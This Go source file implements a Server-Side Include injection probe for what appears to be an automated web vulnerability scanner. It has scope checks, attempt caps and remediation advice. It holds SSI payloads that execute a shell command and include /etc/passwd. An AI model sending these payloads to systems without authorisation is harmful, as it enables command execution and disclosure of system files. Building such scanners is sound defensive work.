package scanner

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"

	"auto-bughunter/backend/internal/model"
	"auto-bughunter/backend/internal/safety"
	"auto-bughunter/backend/internal/scope"
)

// ssiBodyLimit caps response body reads during SSI injection probing.
const ssiBodyLimit = 64 * 1024

// ssiMaxAttempts caps the probe budget across all endpoints and parameters.
const ssiMaxAttempts = 16

// ssiOutputMarker is the expected arithmetic result of the eval payload
// <!--#echo var="DOCUMENT_ROOT"--> gives the server's document root;
// the numeric eval "7*7" result "49" is used as the confirmation marker.
const ssiOutputMarker = "49"

// ssiExecMarker is a unique string injected via SSI <!--#exec cmd="..."--> to
// distinguish SSI command execution from SSTI (which uses different syntax).
const ssiExecMarker = "abh_ssi_exec_4e7b2"

// ssiPayloads are the SSI injection strings tried per parameter.
// They cover the three main SSI directives:
//   - <!--#exec cmd="..."-->  — command execution
//   - <!--#include virtual="..."-->  — file inclusion
//   - <!--#echo var="..."-->  — variable reflection
var ssiPayloads = []struct {
	label   string
	payload string
	marker  string
}{
	{
		label:   "exec-echo",
		payload: "<!--#exec cmd=\"echo " + ssiExecMarker + "\"-->",
		marker:  ssiExecMarker,
	},
	{
		label:   "expr-eval",
		payload: "<!--#expr expr=\"7*7\"-->",
		marker:  ssiOutputMarker,
	},
	{
		label:   "echo-docroot",
		payload: "<!--#echo var=\"DOCUMENT_ROOT\"-->",
		marker:  "/", // any path separator in response suggests SSI echo worked
	},
	{
		label:   "include-passwd",
		payload: "<!--#include virtual=\"/etc/passwd\"-->",
		marker:  "root:",
	},
}

// ssiParams are parameter names most likely to be written into SSI-parsed
// output (search boxes, message fields, name fields).
var ssiParams = []string{"q", "search", "query", "name", "message", "msg", "text", "content", "comment"}

// runSSIInjectionProbe is an active probe covering WSTG-INPV-08. It injects
// Server-Side Includes (SSI) directives into common reflection parameters and
// checks whether the marker appears in the response body.
//
// SSI injection is distinct from SSTI: SSI uses HTML comment syntax
// (<!--#...-->) processed by Apache mod_include or Nginx ngx_http_ssi_module,
// not a template engine. The probe fingerprints the tech stack (when available)
// to prioritize Apache/Nginx targets.
func (s *Service) runSSIInjectionProbe(ctx context.Context, input RunInput, bodyText string) []model.Finding {
	if input.Options.PassiveOnly {
		return nil
	}

	candidates := extractRuntimeEndpoints(input.Target, bodyText, input.Scope, 8)
	if len(input.Options.SeedRuntimeEndpoints) > 0 {
		candidates = append(candidates, input.Options.SeedRuntimeEndpoints...)
	}
	if len(candidates) == 0 {
		candidates = []string{input.Target}
	}

	if input.Emit != nil {
		input.Emit(model.ScanEvent{
			Type:    model.ScanEventCommand,
			Command: fmt.Sprintf("ssi-injection %s", input.Target),
			Message: "Probing for Server-Side Include (SSI) injection",
		})
	}

	var findings []model.Finding
	emitted := map[string]bool{}
	attempts := 0
	dynamicParams := phase2DynamicParams(input.Session)
	probeParams := phase2ProbeParams(dynamicParams, ssiParams)

	for _, raw := range candidates {
		if attempts >= ssiMaxAttempts {
			break
		}
		raw = strings.TrimSpace(raw)
		if raw == "" {
			continue
		}
		if err := safety.ValidateOutboundURL(raw); err != nil {
			continue
		}
		if !scope.IsURLInScope(raw, input.Scope) {
			continue
		}

		base, err := url.Parse(raw)
		if err != nil || base.Scheme == "" || base.Host == "" {
			continue
		}

		for _, param := range probeParams {
			if attempts >= ssiMaxAttempts {
				break
			}
			for _, p := range ssiPayloads {
				fid := "ssi-injection-" + p.label + "-" + hhSlug(raw) + "-" + param
				if emitted[fid] {
					continue
				}

				q := url.Values{}
				q.Set(param, p.payload)
				probeURL := url.URL{
					Scheme:   base.Scheme,
					Host:     base.Host,
					Path:     base.Path,
					RawQuery: q.Encode(),
				}

				req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL.String(), nil)
				if err != nil {
					continue
				}
				ApplyAuthProfile(req, input.AuthProfile)

				resp, err := s.doRequestWithRetry(ctx, req, input.Options)
				attempts++
				RecordProbedKey(http.MethodGet, probeURL.String(), param)
				if err != nil || resp == nil {
					continue
				}
				respBody, _ := io.ReadAll(io.LimitReader(resp.Body, ssiBodyLimit))
				respHeader := resp.Header
				_ = resp.Body.Close()
				if !IsHTMLShape(respHeader) {
					continue
				}
				respStr := string(respBody)

				if !strings.Contains(respStr, p.marker) {
					continue
				}

				// Ensure it wasn't merely echoed (the payload itself contains the marker only after processing).
				if p.label != "echo-docroot" && strings.Contains(respStr, p.payload) {
					// Raw payload echoed back — SSI directives were not processed.
					continue
				}

				baselines, berr := s.phase1QueryBaselines(ctx, probeURL.String(), param, "safe", true, input, ssiBodyLimit)
				if berr == nil && phase1BaselineContains(baselines, p.marker) {
					continue
				}
				diffOutcome := phase1DifferentialQuery(ctx, s, input, "ssi-injection", probeURL.String(), param, p.payload, "safe", ssiBodyLimit,
					func(_ context.Context, _ string, _ *http.Response, body []byte) (bool, error) {
						return strings.Contains(string(body), p.marker), nil
					})
				if diffOutcome.Ran && !diffOutcome.Confirmed {
					continue
				}

				emitted[fid] = true
				severity := model.SeverityHigh
				if p.label == "exec-echo" || p.label == "include-passwd" {
					severity = model.SeverityCritical
				}

				curl := buildCurlReproducer(http.MethodGet, probeURL.String(), input.AuthProfile, "", "")
				refCtx := ClassifyReflectionContext(respStr, p.marker)
				finding := model.Finding{
					ID:       fid,
					Category: "injection",
					Severity: severity,
					Title:    fmt.Sprintf("SSI injection — %s directive processed (param=%q)", p.label, param),
					Description: fmt.Sprintf(
						"The endpoint %s processed an SSI (Server-Side Include) directive injected into "+
							"the %q parameter. The payload %q caused the server to evaluate the SSI "+
							"directive and return the expected marker %q in the response. "+
							"SSI injection can be escalated to arbitrary command execution "+
							"(<!--#exec cmd=\"...\"--> ) or sensitive file disclosure "+
							"(<!--#include virtual=\"/etc/passwd\"-->).",
						raw, param, p.payload, p.marker,
					),
					Evidence: fmt.Sprintf(
						"GET %s → HTTP %d; response contained SSI output marker %q",
						probeURL.String(), resp.StatusCode, p.marker,
					),
					Recommendation: "Disable SSI processing (Apache: remove Includes from Options; " +
						"nginx: remove ssi on directive). Sanitize all user input reflected into HTML output. " +
						"If SSI is required for legitimate pages, ensure no user-controlled content " +
						"is injected into SSI-parsed HTML without strict escaping.",
					Confidence:        0.88,
					AffectedURL:       raw,
					AffectedParameter: param,
					CWE:               "CWE-97",
					OWASPCategory:     "A03:2021 - Injection",
					Sources:           []string{"active-scanner", "ssi-injection"},
					ReproductionSteps: []string{
						fmt.Sprintf("GET %s", probeURL.String()),
						fmt.Sprintf("Observe marker %q in response confirming SSI processing.", p.marker),
					},
					PoC: curl,
					EvidenceFields: map[string]string{
						"validationType":    "active-probe",
						"ssiLabel":          p.label,
						"param":             param,
						"payload":           p.payload,
						"marker":            p.marker,
						"responseStatus":    fmt.Sprintf("%d", resp.StatusCode),
						"responseShape":     ClassifyResponseShape(respHeader).String(),
						"reflectionContext": refCtx.String(),
						"method":            http.MethodGet,
						"url":               probeURL.String(),
						"payloadClass":      "ssi-injection",
						"oracleName":        "ssi_injection_probe",
						"oracleVersion":     "v1",
					},
				}
				AttachDifferentialEvidence(&finding, diffOutcome)
				findings = append(findings, finding)
				break // one finding per endpoint+param
			}
		}
	}

	return findings
}

// detectSSIMarker returns the first ssiPayload whose marker appears in body
// and whose raw payload is NOT verbatim in the body (confirming evaluation).
// Exported for test use.
func detectSSIMarker(body string) *struct{ label, marker string } {
	for _, p := range ssiPayloads {
		if strings.Contains(body, p.marker) {
			// If the full payload is present verbatim, SSI was not processed.
			if p.label != "echo-docroot" && strings.Contains(body, p.payload) {
				continue
			}
			return &struct{ label, marker string }{label: p.label, marker: p.marker}
		}
	}
	return nil
}
